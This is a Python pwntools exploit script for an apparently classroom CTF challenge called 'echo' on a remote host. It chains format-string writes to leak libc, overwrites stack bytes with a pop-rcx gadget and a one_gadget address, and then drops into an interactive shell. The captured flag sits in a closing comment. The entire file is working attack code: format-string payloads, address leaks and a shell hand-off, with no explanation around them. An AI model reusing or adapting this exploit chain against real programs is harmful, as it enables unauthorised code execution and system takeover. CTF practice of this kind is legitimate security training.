from pwn import *
from termcolor import colored

def fmt( p ):
	r.send(p+'\n')
	raw_input('waiting for you~~')

def get(i,n):
	ret = (i>>16*(n-1))&0xffff
	print("get:" ,hex(i) , 'ret' , hex(ret))
	return ret

# overwrite bad_fd
bad_fd = 0x601010
# r = process('./echo')
print('use enter to control your flow~')
r = remote('csie.ctf.tw',10132)
raw_input("ready_to_pwn?")

# change fd
fmt('%{}c%7$n'.format(bad_fd ))
fmt( 'Q%9$hhn'.format( 1 ) )

# leak information
fmt( '|%10$p||' )
libc_base = int(r.recvuntil('||').split('|')[-3],16) - 0x21b97
print(colored('libc_base  : %x' % libc_base,'red')) 

'''
one gadget
0x4f2c5	  rcx == NULL
0x4f322	  [rsp+0x40] == NULL
0x10a38c  [rsp+0x70] == NULL
'''
pop_rcx = libc_base + 0x03eb0b 
one_gadget = libc_base + 0x4f2c5 

fmt('|%7$p||')
b = int(r.recvuntil('||').split('|')[-3],16) - 0x08 &  0xff

print(colored('stack_base_6: %x' % b,'red')) 
print(colored('sys_pop_rcx : %x' % pop_rcx,'red')) 
print(colored('one_gadget  : %x' % one_gadget,'red')) 


fmt( '%{}c%5$hhn'.format( b ) )
fmt( '%{}c%7$hnZZ1'.format( get( pop_rcx, 1 ) ) )
r.recvuntil('ZZ1')
print('ZZ1')

fmt( '%{}c%5$hhn'.format( b+2 ) )
fmt( '%{}c%7$hnZZ2'.format( get( pop_rcx, 2 ) ) )
r.recvuntil('ZZ2')
print('ZZ2')

fmt( '%{}c%5$hhn'.format( b+4 ) )
fmt( '%{}c%7$hnZZ3'.format( get( pop_rcx, 3 ) ) )
r.recvuntil('ZZ3')
print('ZZ3')


fmt( '%{}c%5$hhn'.format( b+16 ) )
fmt( '%{}c%7$hnZZ1'.format( get( one_gadget, 1 ) ) )
r.recvuntil('ZZ1')
print('ZZ1')

fmt( '%{}c%5$hhn'.format( b+16+2 ) )
fmt( '%{}c%7$hnZZ2'.format( get( one_gadget, 2 ) ) )
r.recvuntil('ZZ2')
print('ZZ2')

fmt( '%{}c%5$hhn'.format( b+16+4 ) )
fmt( '%{}c%7$hnZZ3'.format( get( one_gadget, 3 ) ) )
r.recvuntil('ZZ3')
print('ZZ3')


raw_input('fQAQ')
fmt( '%{}c%5$hhn'.format( b+8 ) )
fmt( '%7$n'.ljust(0x30) )
raw_input('finish!')
r.send('exit\n')
r.interactive()

# FLAG{J0hn_cena_:_Y0u_c4n't_see_m3_!!!!!!!}
